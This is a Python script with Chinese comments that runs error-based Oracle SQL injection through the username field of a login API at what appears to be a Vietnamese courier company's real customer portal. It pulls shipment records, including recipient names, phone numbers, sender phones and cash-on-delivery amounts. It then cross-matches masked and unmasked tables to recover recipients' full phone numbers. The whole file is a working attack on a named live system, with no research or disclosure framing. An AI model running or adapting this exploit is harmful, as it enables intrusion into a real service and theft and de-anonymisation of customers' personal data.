#!/usr/bin/env python3
"""
使用不脱敏的字段来建立匹配关系
尝试多种匹配策略：
1. MABC + 日期 + 代收金额
2. MABC + 日期 + 发件人电话
3. MABC + 日期 + 姓名（去掉+号后）
4. 组合多个字段提高匹配准确性
"""

import requests
import json
import time

class UnmaskedFieldMatcher:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def match_by_amount_and_date(self):
        """策略1: MABC + 日期 + 代收金额"""
        print("=" * 80)
        print("🔍 策略1: MABC + 日期 + 代收金额三重匹配")
        print("=" * 80)
        
        date = '20251010'
        
        # 获取5个有代收金额的MABC
        print("\n获取有代收金额的订单...")
        
        match_count = 0
        mismatch_count = 0
        
        for i in range(1, 6):
            print(f"\n{'='*80}")
            print(f"测试 {i}/5")
            print(f"{'='*80}")
            
            # 获取MABC和代收金额
            query_mabc = f"SELECT MABC FROM (SELECT DISTINCT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND SO_TIEN_THU_HO>0) WHERE ROWNUM={i}"
            mabc = self.extract_via_error(query_mabc)
            
            if not mabc:
                continue
            
            print(f"MABC: {mabc}")
            
            # 从E1E2_PH获取代收金额和电话
            query1 = f"SELECT SO_TIEN_THU_HO||'|'||DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            data1 = self.extract_via_error(query1)
            
            if data1:
                parts1 = data1.split('|')
                amount1 = parts1[0] if len(parts1) > 0 else ""
                phone1 = parts1[1] if len(parts1) > 1 else ""
                
                print(f"  E1E2_PH:")
                print(f"    代收金额: {amount1} VND")
                print(f"    收件电话: {phone1}")
                
                time.sleep(2)
                
                # 用MABC+日期+代收金额在TEMP_LOG中查找
                query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}' AND SO_TIEN_THU_HO='{amount1}' AND ROWNUM=1"
                phone2 = self.extract_via_error(query2)
                
                print(f"  TEMP_DATA2_LOG (同MABC+日期+金额):")
                if phone2:
                    print(f"    收件电话: {phone2}")
                    
                    # 验证后4位
                    if phone1 and phone2:
                        last4_1 = phone1[-4:] if len(phone1) >= 4 else ""
                        last4_2 = phone2[-4:] if len(phone2) >= 4 else ""
                        
                        if last4_1 == last4_2:
                            print(f"    ✅ 匹配！后4位都是: {last4_1}")
                            print(f"    📊 三重验证：MABC={mabc}, 日期={date}, 金额={amount1}")
                            match_count += 1
                        else:
                            print(f"    ❌ 电话不匹配: {last4_1} vs {last4_2}")
                            mismatch_count += 1
                else:
                    print(f"    ⚠️  未找到匹配记录")
            
            time.sleep(2)
        
        print(f"\n{'='*80}")
        print(f"策略1结果: ✅{match_count} ❌{mismatch_count}")
        print(f"{'='*80}")
    
    def match_by_sender_phone(self):
        """策略2: MABC + 日期 + 发件人电话"""
        print("\n" + "=" * 80)
        print("🔍 策略2: MABC + 日期 + 发件人电话匹配")
        print("=" * 80)
        
        date = '20251010'
        
        match_count = 0
        mismatch_count = 0
        
        for i in range(1, 6):
            print(f"\n{'='*80}")
            print(f"测试 {i}/5")
            print(f"{'='*80}")
            
            # 获取有发件人电话的MABC
            query_mabc = f"SELECT MABC FROM (SELECT DISTINCT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAIGUI IS NOT NULL AND DIENTHOAIGUI!='0') WHERE ROWNUM={i}"
            mabc = self.extract_via_error(query_mabc)
            
            if not mabc:
                continue
            
            print(f"MABC: {mabc}")
            
            # E1E2_PH的数据
            query1 = f"SELECT DIENTHOAIGUI||'|'||DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            data1 = self.extract_via_error(query1)
            
            if data1:
                parts1 = data1.split('|')
                sender1 = parts1[0] if len(parts1) > 0 else ""
                receiver1 = parts1[1] if len(parts1) > 1 else ""
                
                print(f"  E1E2_PH:")
                print(f"    发件电话: {sender1}")
                print(f"    收件电话: {receiver1}")
                
                time.sleep(2)
                
                # 用MABC+日期+发件电话匹配
                query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}' AND DIENTHOAIGUI='{sender1}' AND ROWNUM=1"
                receiver2 = self.extract_via_error(query2)
                
                print(f"  TEMP_DATA2_LOG (同MABC+日期+发件电话):")
                if receiver2:
                    print(f"    收件电话: {receiver2}")
                    
                    # 验证后4位
                    if receiver1 and receiver2:
                        last4_1 = receiver1[-4:] if len(receiver1) >= 4 else ""
                        last4_2 = receiver2[-4:] if len(receiver2) >= 4 else ""
                        
                        if last4_1 == last4_2:
                            print(f"    ✅ 匹配！后4位都是: {last4_1}")
                            print(f"    📊 通过发件电话验证成功: {sender1}")
                            match_count += 1
                        else:
                            print(f"    ❌ 电话不匹配: {last4_1} vs {last4_2}")
                            mismatch_count += 1
                else:
                    print(f"    ⚠️  未找到匹配记录")
            
            time.sleep(2)
        
        print(f"\n{'='*80}")
        print(f"策略2结果: ✅{match_count} ❌{mismatch_count}")
        print(f"{'='*80}")
    
    def match_by_combination(self):
        """策略3: 多字段组合匹配"""
        print("\n" + "=" * 80)
        print("🔍 策略3: MABC + 日期 + 金额 + 发件电话组合验证")
        print("=" * 80)
        
        date = '20251010'
        
        perfect_match = 0
        partial_match = 0
        no_match = 0
        
        for i in range(1, 6):
            print(f"\n{'='*80}")
            print(f"测试 {i}/5")
            print(f"{'='*80}")
            
            # 获取MABC
            query_mabc = f"SELECT MABC FROM (SELECT DISTINCT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAIGUI IS NOT NULL) WHERE ROWNUM={i}"
            mabc = self.extract_via_error(query_mabc)
            
            if not mabc:
                continue
            
            print(f"MABC: {mabc}")
            
            # E1E2_PH完整数据
            query1 = f"SELECT DIENTHOAIGUI||'|'||SO_TIEN_THU_HO||'|'||DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            data1 = self.extract_via_error(query1)
            
            if data1:
                parts1 = data1.split('|')
                sender1 = parts1[0] if len(parts1) > 0 else ""
                amount1 = parts1[1] if len(parts1) > 1 else ""
                receiver1 = parts1[2] if len(parts1) > 2 else ""
                
                print(f"\n  【E1E2_PH】")
                print(f"    发件电话: {sender1}")
                print(f"    代收金额: {amount1} VND")
                print(f"    收件电话: {receiver1}")
                
                time.sleep(2)
                
                # 用完整条件匹配
                query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}' AND DIENTHOAIGUI='{sender1}' AND SO_TIEN_THU_HO='{amount1}' AND ROWNUM=1"
                receiver2 = self.extract_via_error(query2)
                
                print(f"\n  【TEMP_DATA2_LOG (4重匹配)】")
                print(f"    匹配条件: MABC+日期+发件电话+金额")
                
                if receiver2:
                    print(f"    收件电话: {receiver2}")
                    
                    # 验证
                    if receiver1 and receiver2:
                        last4_1 = receiver1[-4:] if len(receiver1) >= 4 else ""
                        last4_2 = receiver2[-4:] if len(receiver2) >= 4 else ""
                        
                        if receiver1 == receiver2:
                            print(f"    ✅ 完美匹配！电话完全一致: {receiver1}")
                            perfect_match += 1
                        elif last4_1 == last4_2:
                            print(f"    ✅ 部分匹配！后4位一致: {last4_1}")
                            partial_match += 1
                        else:
                            print(f"    ❌ 不匹配: {last4_1} vs {last4_2}")
                            no_match += 1
                else:
                    print(f"    ⚠️  未找到匹配记录")
                    no_match += 1
            
            time.sleep(2)
        
        print(f"\n{'='*80}")
        print(f"策略3结果:")
        print(f"  ✅ 完美匹配: {perfect_match}/5")
        print(f"  ✅ 部分匹配: {partial_match}/5")
        print(f"  ❌ 不匹配: {no_match}/5")
        print(f"{'='*80}")
    
    def find_unmasked_receiver_phone(self):
        """尝试找到真正未脱敏的收件人电话"""
        print("\n" + "=" * 80)
        print("🔍 策略4: 查找是否有未脱敏的收件人电话")
        print("=" * 80)
        
        tables = [
            ('E1E2_PH_TEMP_DATA2_LOG', 'DIENTHOAINHAN'),
            ('E1E2_PH_DECRYPT_DATA', 'DIENTHOAINHAN'),
            ('SHIPMENT', 'RECEIVER_PHONE'),
            ('E1E2_PH_LOG', 'DIENTHOAINHAN'),
        ]
        
        for table, phone_field in tables:
            print(f"\n{'='*80}")
            print(f"表: {table}")
            print(f"{'='*80}")
            
            # 查找09开头、长度>=10、不含+号的电话
            query = f"SELECT {phone_field} FROM EMS.{table} WHERE {phone_field} LIKE '09%' AND LENGTH({phone_field})>=10 AND {phone_field} NOT LIKE '%+%' AND {phone_field} NOT LIKE '%x%' AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result:
                print(f"  ✅ 找到可能的真实电话: {result}")
                
                # 验证格式
                if len(result) >= 10 and result[0:2] in ['09', '03', '07', '08']:
                    print(f"  ✅ 格式正确！这是真实越南手机号")
                    
                    # 尝试找对应的MABC
                    time.sleep(1)
                    query_mabc = f"SELECT MABC FROM EMS.{table} WHERE {phone_field}='{result}' AND ROWNUM=1"
                    mabc = self.extract_via_error(query_mabc)
                    
                    if mabc:
                        print(f"  📋 对应MABC: {mabc}")
                        
                        # 查看这个MABC的日期
                        time.sleep(1)
                        query_date = f"SELECT NGAY FROM EMS.{table} WHERE MABC='{mabc}' AND ROWNUM=1"
                        ngay = self.extract_via_error(query_date)
                        
                        if ngay:
                            print(f"  📅 日期: {ngay}")
                            
                            if ngay == '20251010':
                                print(f"  ✅ 是10月10日的数据！可以用来解密！")
                            else:
                                print(f"  ⚠️  不是10月10日，是历史数据")
            else:
                print(f"  ❌ 未找到真实电话")
            
            time.sleep(2)
    
    def comprehensive_matching_test(self):
        """综合测试：找一个订单，尝试所有匹配方法"""
        print("\n" + "=" * 80)
        print("🎯 综合测试：完整匹配流程")
        print("=" * 80)
        
        date = '20251010'
        
        # 选一个有完整信息的MABC
        query_mabc = f"SELECT MABC FROM (SELECT DISTINCT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIENTHOAIGUI IS NOT NULL AND SO_TIEN_THU_HO>0) WHERE ROWNUM=1"
        mabc = self.extract_via_error(query_mabc)
        
        if not mabc:
            print("未找到测试MABC")
            return
        
        print(f"\n测试MABC: {mabc}")
        print(f"{'='*80}")
        
        # 获取E1E2_PH的完整数据
        print(f"\n【表1: E1E2_PH】")
        
        query1 = f"SELECT NGUOINHAN||'|'||DIENTHOAINHAN||'|'||DIENTHOAIGUI||'|'||SO_TIEN_THU_HO FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
        data1 = self.extract_via_error(query1)
        
        if data1:
            parts = data1.split('|')
            if len(parts) >= 4:
                name1 = parts[0]
                receiver1 = parts[1]
                sender1 = parts[2]
                amount1 = parts[3]
                
                print(f"  姓名: {name1}")
                print(f"  收件电话: {receiver1}")
                print(f"  发件电话: {sender1}")
                print(f"  代收金额: {amount1} VND")
        
        time.sleep(2)
        
        # 方法1: 只用MABC+日期
        print(f"\n【方法1: MABC + 日期】")
        query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
        phone2 = self.extract_via_error(query2)
        if phone2:
            print(f"  收件电话: {phone2}")
            if receiver1:
                print(f"  匹配: {'✅' if receiver1[-4:] == phone2[-4:] else '❌'}")
        
        time.sleep(2)
        
        # 方法2: MABC+日期+发件电话
        print(f"\n【方法2: MABC + 日期 + 发件电话】")
        query3 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}' AND DIENTHOAIGUI='{sender1}' AND ROWNUM=1"
        phone3 = self.extract_via_error(query3)
        if phone3:
            print(f"  收件电话: {phone3}")
            if receiver1:
                print(f"  匹配: {'✅' if receiver1[-4:] == phone3[-4:] else '❌'}")
        
        time.sleep(2)
        
        # 方法3: MABC+日期+发件电话+金额
        print(f"\n【方法3: MABC + 日期 + 发件电话 + 金额】")
        query4 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}' AND DIENTHOAIGUI='{sender1}' AND SO_TIEN_THU_HO='{amount1}' AND ROWNUM=1"
        phone4 = self.extract_via_error(query4)
        if phone4:
            print(f"  收件电话: {phone4}")
            if receiver1:
                match_result = ""
                if phone4 == receiver1:
                    match_result = "✅ 完全一致！"
                elif receiver1[-4:] == phone4[-4:]:
                    match_result = "✅ 后4位一致"
                else:
                    match_result = "❌ 不匹配"
                print(f"  匹配: {match_result}")
    
    def run_matching(self):
        """执行所有匹配测试"""
        print("=" * 80)
        print("🔍 使用不脱敏字段进行匹配测试")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行所有策略
        self.match_by_amount_and_date()
        self.match_by_sender_phone()
        self.match_by_combination()
        self.find_unmasked_receiver_phone()
        self.comprehensive_matching_test()
        
        print("\n" + "=" * 80)
        print("🎉 测试完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    matcher = UnmaskedFieldMatcher(target_url)
    matcher.run_matching()
